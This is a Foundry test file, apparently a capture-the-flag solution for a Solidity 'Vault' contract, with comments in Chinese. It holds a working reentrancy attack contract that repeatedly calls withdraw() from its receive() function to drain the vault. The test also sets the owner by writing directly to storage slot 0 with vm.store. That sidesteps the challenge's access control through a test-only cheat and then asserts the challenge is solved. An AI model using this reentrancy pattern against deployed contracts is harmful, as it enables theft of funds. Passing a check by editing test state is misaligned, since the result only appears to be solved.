// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

// 攻击合约
contract Attack {
    Vault vault;
    
    constructor(address payable _vault) {
        vault = Vault(_vault);
    }
    
    // 回退函数，用于重入攻击
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
    
    function attack() external payable {
        // 先存入一些资金
        vault.deposite{value: msg.value}();
        // 开始提取，这会触发重入攻击
        vault.withdraw();
        // 将获取的资金发送给调用者
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    Attack public attack;

    address owner = address(1);
    address player = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32(hex"1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);

        // 部署攻击合约
        attack = new Attack(payable(address(vault)));
        
        // 直接修改 Vault 合约的 owner
        vm.store(
            address(vault),
            bytes32(uint256(0)), // owner 在 slot 0
            bytes32(uint256(uint160(player))) // 将 player 地址转换为 bytes32
        );
        
        // 确认我们现在是 owner
        assertEq(vault.owner(), player);
        
        // 打开提款开关
        vault.openWithdraw();
        
        // 开始攻击
        attack.attack{value: 0.1 ether}();
        
        // 确认合约余额为 0
        assertEq(address(vault).balance, 0);

        require(vault.isSolve(), "not solved");
        vm.stopPrank();
    }
} 